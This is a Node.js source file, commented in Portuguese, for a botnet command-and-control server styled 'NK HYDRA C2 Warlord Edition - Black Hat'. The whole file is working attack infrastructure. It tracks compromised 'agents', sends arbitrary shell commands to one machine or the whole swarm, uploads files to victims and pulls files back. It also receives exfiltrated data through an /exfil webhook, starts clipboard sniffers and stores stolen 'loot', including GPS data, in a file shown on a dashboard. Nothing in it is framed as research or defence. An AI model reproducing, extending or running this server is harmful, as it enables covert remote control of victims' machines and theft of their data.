// NK HYDRA C2 SERVER v7.0 (Warlord Edition - Black Hat Aprimorado)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs'); // Para persistência de loot
const path = require('path'); // Para caminhos de arquivo

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'))); // Servir arquivos estáticos (se tiver)

let agents = new Map();
let loot = [];
const LOOT_FILE = 'loot.json';

// --- FUNÇÕES DE PERSISTÊNCIA DE LOOT ---
const loadLoot = () => {
    if (fs.existsSync(LOOT_FILE)) {
        try {
            const data = fs.readFileSync(LOOT_FILE, 'utf8');
            loot = JSON.parse(data);
            console.log(`[SYSTEM] Loot carregado de ${LOOT_FILE}. Total: ${loot.length}`);
        } catch (e) {
            console.error(`[ERROR] Falha ao carregar loot de ${LOOT_FILE}:`, e);
            loot = [];
        }
    }
};

const saveLoot = () => {
    fs.writeFile(LOOT_FILE, JSON.stringify(loot, null, 2), (err) => {
        if (err) console.error(`[ERROR] Falha ao salvar loot em ${LOOT_FILE}:`, err);
    });
};

// Carregar loot ao iniciar o servidor
loadLoot();

// --- TACTICAL DASHBOARD (AGORA INTERATIVO COM CLIENT-SIDE JS) ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html')); // Servir o novo dashboard HTML
});

// --- API Endpoints for Pentest Tools ---
app.get('/api/status', (req, res) => {
    res.json({ status: 'online', agents: agents.size, uptime: process.uptime() });
});

app.get('/api/agents', (req, res) => {
    const list = [];
    agents.forEach((agentData, id) => list.push({ id, ...agentData }));
    res.json(list);
});

app.get('/api/loot', (req, res) => {
    res.json(loot);
});

// Endpoint para pegar o conteúdo completo de um item de loot
app.get('/api/loot/:index', (req, res) => {
    const index = parseInt(req.params.index);
    if (index >= 0 && index < loot.length) {
        res.json(loot[index]);
    } else {
        res.status(404).send('Loot item not found');
    }
});

// 3. Webhook for HTTP Exfiltration
app.post('/exfil', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    const newLootItem = {
        time: timestamp,
        agentId: data.agentId || 'UNKNOWN_HTTP', // Agente pode enviar seu ID
        type: data.type || 'HTTP_EXFIL',
        data: data.payload || JSON.stringify(data)
    };
    loot.unshift(newLootItem);
    saveLoot(); // Salva o loot
    io.emit('loot_update', newLootItem); // Notifica o dashboard
    io.emit('log', `[HTTP EXFIL from ${newLootItem.agentId}] ${String(newLootItem.data).substring(0, 100)}...`);
    res.send('ACK');
});

io.on('connection', (socket) => {
    // 1. Identificação do Agente/UI
    socket.on('identify', ({ type, id, os, ip }) => { // Agente pode enviar mais dados
        if (type === 'agent') {
            agents.set(id, { 
                socketId: socket.id, 
                lastSeen: new Date().toISOString(), 
                ip: ip || socket.handshake.address, // IP do agente ou do socket
                os: os || 'Unknown', // Sistema operacional do agente
                capabilities: ['gps', 'clipboard', 'exec', 'file_read', 'file_write'] // Capacidades do agente
            });
            console.log(`[+] AGENT ONLINE: ${id} (${agents.get(id).ip})`);
            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id} (${agents.get(id).ip})`);
            io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
        } else {
            console.log('[+] COMMANDER UI CONNECTED');
            // Envia o estado atual para a UI recém-conectada
            socket.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
            socket.emit('loot_update_initial', loot);
        }
    });

    // 2. Comandos Gerais (UI -> Agente)
    socket.on('cmd', (data) => {
        const { cmd, target } = data;
        if (target && target !== 'all') {
            const agentData = agents.get(target);
            if (agentData) {
                io.to(agentData.socketId).emit('exec', { cmd });
                io.emit('log', `[CMD] -> ${target}: ${cmd}`);
            } else {
                io.emit('log', `[ERR] Target ${target} not found.`);
            }
        } else {
            agents.forEach(agentData => io.to(agentData.socketId).emit('exec', { cmd }));
            io.emit('log', `[CMD] -> SWARM: ${cmd}`);
        }
    });

    // 3. Upload de Arquivos (UI -> Agente)
    socket.on('upload_file', (data) => {
        const { target, filename, b64content } = data;
        const payload = { cmd: `write_file ${filename} ${b64content}` }; // Agente precisa implementar 'write_file'
        
        if (target && target !== 'all') {
            const agentData = agents.get(target);
            if (agentData) {
                io.to(agentData.socketId).emit('exec', payload);
                io.emit('log', `[UPLOAD] Sending ${filename} to ${target}...`);
            }
        } else {
            agents.forEach(agentData => io.to(agentData.socketId).emit('exec', payload));
            io.emit('log', `[UPLOAD] Broadcasting ${filename} to SWARM...`);
        }
    });

    // 4. Download de Arquivos (UI -> Agente -> C2)
    socket.on('request_file_from_agent', ({ target, filepath }) => {
        const agentData = agents.get(target);
        if (agentData) {
            // Agente precisa implementar 'read_file' que envia 'file_content_from_agent'
            io.to(agentData.socketId).emit('exec', { cmd: `read_file ${filepath}` }); 
            io.emit('log', `[DOWNLOAD] Requesting ${filepath} from ${target}...`);
        } else {
            io.emit('log', `[ERR] Target ${target} not found for file download.`);
        }
    });

    socket.on('file_content_from_agent', (data) => {
        const { from, filename, b64content, error } = data;
        if (error) {
            io.emit('log', `[DOWNLOAD_ERROR from ${from}] ${error}`);
            return;
        }
        const timestamp = new Date().toISOString();
        const newLootItem = {
            time: timestamp,
            agentId: from,
            type: 'FILE_EXFIL',
            filename: filename,
            data: b64content // Armazena o conteúdo base64 completo
        };
        loot.unshift(newLootItem);
        saveLoot();
        io.emit('loot_update', newLootItem);
        io.emit('log', `[FILE EXFIL from ${from}] ${filename} (${b64content.length} bytes base64)`);
    });

    // 5. Controle de Sniffer de Clipboard (UI -> Agente)
    socket.on('start_sniffer_cmd', ({ target }) => {
        const agentData = agents.get(target);
        if (agentData) {
            io.to(agentData.socketId).emit('exec', { cmd: `start_clipboard_sniffer` }); // Agente precisa implementar
            io.emit('log', `[SNIFFER] Starting clipboard sniffer on ${target}...`);
        } else {
            io.emit('log', `[ERR] Target ${target} not found for sniffer control.`);
        }
    });

    socket.on('stop_sniffer_cmd', ({ target }) => {
        const agentData = agents.get(target);
        if (agentData) {
            io.to(agentData.socketId).emit('exec', { cmd: `stop_clipboard_sniffer` }); // Agente precisa implementar
            io.emit('log', `[SNIFFER] Stopping clipboard sniffer on ${target}...`);
        } else {
            io.emit('log', `[ERR] Target ${target} not found for sniffer control.`);
        }
    });

    // 6. Logs e Exfiltração (Agente -> C2)
    socket.on('stream_log', (data) => {
        const { from, output, type } = data; // Agente pode enviar um 'type' para o loot
        const timestamp = new Date().toISOString();

        // Capture loot se marcado ou se for um tipo específico
        if (output.includes('[DATA_START]') || output.includes('[SNIFFER]') || type === 'CLIPBOARD_DATA' || type === 'NMAP_SCAN' || type === 'GPS_DATA') {
             const newLootItem = {
                 time: timestamp,
                 agentId: from,
                 type: type || 'GENERIC_LOOT',
                 data: output
             };
             loot.unshift(newLootItem);
             saveLoot();
             io.emit('loot_update', newLootItem); // Notifica o dashboard
        }
        io.emit('log', `[${from}] ${output}`); // Envia para o dashboard
    });

    socket.on('disconnect', () => {
       let disconnectedAgentId = null;
       agents.forEach((agentData, id) => {
           if(agentData.socketId === socket.id) {
               disconnectedAgentId = id;
               agents.delete(id);
           }
       });
       if (disconnectedAgentId) {
           console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
           io.emit('log', `[SYSTEM] NODE OFFLINE: ${disconnectedAgentId}`);
           io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
       } else {
           console.log('[-] COMMANDER UI DISCONNECTED');
       }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK HYDRA C2 (Warlord Edition) running on port ${PORT}`));